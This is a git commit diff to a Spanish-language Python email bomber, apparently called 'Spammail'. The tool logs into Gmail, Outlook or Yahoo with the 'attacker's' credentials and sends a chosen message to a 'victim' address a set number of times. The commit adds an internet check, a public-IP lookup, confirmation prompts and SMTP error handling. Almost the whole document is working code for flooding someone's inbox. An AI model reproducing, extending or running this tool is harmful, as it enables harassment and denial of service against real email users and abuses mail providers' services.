c0d91bf53930db1ef01137871300fc5b7a99a750
Sempatte <sempatte@protonmail.com>
2018-05-08 13:12:26 -0500

    Requirements
    requirements

--- sendemail.py
+++ sendemail.py
@@ -10,13 +10,19 @@ import sys
 import argparse
 import colorama
 from colorama import Fore
+import requests
+import urllib
+import pycurl
+from io import BytesIO
+
+#BANNER
 print(Fore.BLUE)
-print(           "                                                   ◘◘           ██╗   ██╗  ██╗     ██████╗      ")
-print(           "        ███████╗██████╗  █████╗ ███╗   ███╗ █████╗ ██╗██╗       ██║   ██║ ███║     ╚════██╗     ")
-print(           "        ███████╗██████╔╝███████║██╔████╔██║███████║██║██║       ██║   ██║ ╚██║      █████╔╝     ")
-print(           "        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██╔══██║██║██║       ╚██╗ ██╔╝  ██║     ██╔═══╝      ")
-print(           "        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║  ██║██║███████╗   ╚████╔╝██╗██║██╗  ███████╗     ")
-print(           "        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═══╝ ╚═╝╚═╝╚═╝  ╚══════╝     ")
+print(           "                                                   ◘◘           ██╗   ██╗  ██╗   ██████╗      ")
+print(           "        ███████╗██████╗  █████╗ ███╗   ███╗ █████╗ ██╗██╗       ██║   ██║ ███║   ╚════██╗     ")
+print(           "        ███████╗██████╔╝███████║██╔████╔██║███████║██║██║       ██║   ██║ ╚██║    █████╔╝     ")
+print(           "        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██╔══██║██║██║       ╚██╗ ██╔╝  ██║   ██╔═══╝      ")
+print(           "        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║  ██║██║███████╗   ╚████╔╝██╗██║██╗███████╗     ")
+print(           "        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═══╝ ╚═╝╚═╝╚═╝╚══════╝     ")
 print(           "                                                                                                ")
 print(Fore.CYAN)
 print(           " ██████╗ ██╗   ██╗       ███████╗███████╗███╗   ███╗██████╗  █████╗ ████████╗████████╗███████╗   ")
@@ -32,18 +38,46 @@ print(Fore.CYAN +"                                https://www.fuck-society.com  
 print(Fore.WHITE +"                          Funcionando en: Gmail, Outlook y Yahoo                               ")
 print(            "                                                                                               ")
 
+#Comprobar conectividad
+def connected(host='http://www.google.com'):
+    try:
+        urllib.request.urlopen(host)
+        return True
+    except:
+        return False
+if connected():
+  pass
+else:
+  print(Fore.GREEN + "[!] No esta conectado a internet. Intentalo de nuevo.")
+  sys.exit()
 
+  
+print(Fore.WHITE)
 parser = argparse.ArgumentParser()
-parser.add_argument("-v", "--verbose", help="Mostrar información de depuración")
+parser.add_argument("-d", "--debug", help="Mostrar información de depuración")
+
 
 args = parser.parse_args()
 
-if args.verbose:
+if args.debug:
    print(Fore.RED +"[ON] Depuración")
 
+""" IP """
+buffer = BytesIO()
+c = pycurl.Curl()
+c.setopt(c.URL, 'http://wtfismyip.com/text')
+c.setopt(c.WRITEDATA, buffer)
+c.perform()
+c.close()
+
+body = buffer.getvalue()
+ip = body.decode('iso-8859-1')
+#print("IP PUBLIC: " + ip[7:22])
+print(Fore.GREEN + "Tu IP publica: "+ ip)
+print(Fore.WHITE)
+""" IP """
 
 server = input("[+] Mail server: Gmail, Hotmail/Outlook o Yahoo: ")
-
 server = server.lower()
 
 if server == 'outlook':
@@ -91,7 +125,18 @@ password = getpass.getpass('[+] Contraseña del atacante: ')
 #Correo victima
 to = input('\n[+] Victima: ')
 vct = ('[SET] Correo de la victima: %s')%(to)
-print(vct)
+
+confirm_two = input('[?] Confirmar? Si/no: ')
+confirm_two = confirm_two.lower()
+
+if confirm_two == 'no':
+	vct = str(input('[REPET] Correo de la victima: '))
+else:
+	pass
+
+
+vct_two = ('[SET] Correo de la victima: %s')%(vct)
+print(vct_two)
 
 #Mensaje
 body = input('[+] Mensaje a enviar: ')
@@ -100,6 +145,16 @@ body = input('[+] Mensaje a enviar: ')
 numero = int(input('[+] Numero de veces a enviar:'))
 nmr = ('[SET] Nº: %s')%(numero)
 print(nmr)
+
+#Confirmar proceso
+print(Fore.RED)
+cfr_dos = input("¿Esta seguro que desea continuar? si/no: ")
+print(Fore.WHITE)
+if cfr_dos == 'no':
+	sys.exit()
+else:
+	pass
+
 
 if server == 'gmail':
 	smtp_server = 'smtp.gmail.com'
@@ -133,7 +188,7 @@ try:
 		msg = (body)
 		server.sendmail(user, to ,msg)
 		sends = "\rE-mails enviados: [%i]" % i
-		if args.verbose:
+		if args.debug:
 			print(sends)
 			sys.stdout.flush()			
 		else:
@@ -146,4 +201,8 @@ except KeyboardInterrupt:
 except smtplib.SMTPAuthenticationError:
     print('\n[!] El usuario/email o contraseña introducidos del atacante son erroneos.\nIntentalo de nuevo.')
     sys.exit()
+except smtplib.SMTPServerDisconnected:
+	print('\n [!] El serve fue desconectado por algun error desconocido.\n Intentalo de nuevo.')
+except smtplib.SMTPConnectError:
+	print('\n [!] Error al intentar conectar con el server.\n Verifica tu conexión.')
 
